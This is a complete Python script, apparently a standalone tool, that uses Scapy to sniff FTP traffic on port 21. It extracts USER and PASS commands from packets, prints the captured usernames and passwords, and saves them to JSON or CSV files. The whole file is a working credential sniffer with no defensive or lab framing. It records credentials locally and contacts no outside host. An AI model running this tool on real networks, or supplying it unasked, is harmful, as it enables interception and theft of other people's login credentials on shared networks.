#!/usr/bin/env python3
import argparse
import re
import json
import csv
from datetime import datetime
from scapy.all import sniff, IP, TCP, Raw
from colorama import init, Fore

# colorama for colorized output
init(autoreset=True)
GREEN, RED, CYAN, YELLOW = Fore.GREEN, Fore.RED, Fore.CYAN, Fore.YELLOW

# store results
credentials = []

# function that uses scapy to parse through tcp packets for information, match credentials found in packets
def ftp_packet_handler(pkt, args):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        raw_data = pkt[Raw].load.decode(errors='ignore')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        src_ip = pkt[IP].src if pkt.haslayer(IP) else "Unknown"
        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "Unknown"

        # match ftp users
        user_match = re.search(r'^USER (.+)', raw_data, re.MULTILINE | re.IGNORECASE)
        if user_match and not args.only_pass:
            user = user_match.group(1).strip()
            print(f"{GREEN}|+| {timestamp} | {src_ip} -> {dst_ip} | FTP Username: {user}")
            credentials.append({
                "timestamp": timestamp,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "type": "USER",
                "value": user
            })

        # match ftp passwords
        pass_match = re.search(r'^PASS (.+)', raw_data, re.MULTILINE | re.IGNORECASE)
        if pass_match and not args.only_user:
            pwd = pass_match.group(1).strip()
            print(f"{RED}|+| {timestamp} | {src_ip} -> {dst_ip} | FTP Password: {pwd}")
            credentials.append({
                "timestamp": timestamp,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "type": "PASS",
                "value": pwd
            })

# function to save info into json or csv formats
def save_results(args):
    if args.jsonout:
        with open(args.jsonout, 'w') as jf:
            json.dump(credentials, jf, indent=2)
        print(f"{CYAN}|*| Credentials saved to {args.jsonout}")
    if args.csvout:
        with open(args.csvout, 'w', newline='') as cf:
            writer = csv.DictWriter(cf, fieldnames=["timestamp", "src_ip", "dst_ip", "type", "value"])
            writer.writeheader()
            for entry in credentials:
                writer.writerow(entry)
        print(f"{CYAN}|*| Credentials saved to {args.csvout}")

# arg parser for cli customizability
def main():
    parser = argparse.ArgumentParser(description="Advanced FTP Credential Sniffer (Scapy-based)")
    parser.add_argument("-i", "--iface", required=True, help="Network interface to sniff on (e.g., eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to sniff (0=unlimited)")
    parser.add_argument("--jsonout", help="Save captured credentials to JSON file")
    parser.add_argument("--csvout", help="Save captured credentials to CSV file")
    parser.add_argument("--only-user", action="store_true", help="Capture only USER commands")
    parser.add_argument("--only-pass", action="store_true", help="Capture only PASS commands")
    args = parser.parse_args()

    print(f"{YELLOW}|*| Starting FTP sniffer on {args.iface}... Press Ctrl+C to stop.")

    try:
        sniff(
            iface=args.iface,
            filter="tcp port 21",
            prn=lambda pkt: ftp_packet_handler(pkt, args),
            store=False,
            count=args.count
        )
    except KeyboardInterrupt:
        print(f"\n{CYAN}|*| Sniffing stopped.")

    if credentials:
        save_results(args)
    else:
        print(f"{RED}|-| No FTP credentials captured.")

if __name__ == "__main__":
    main()
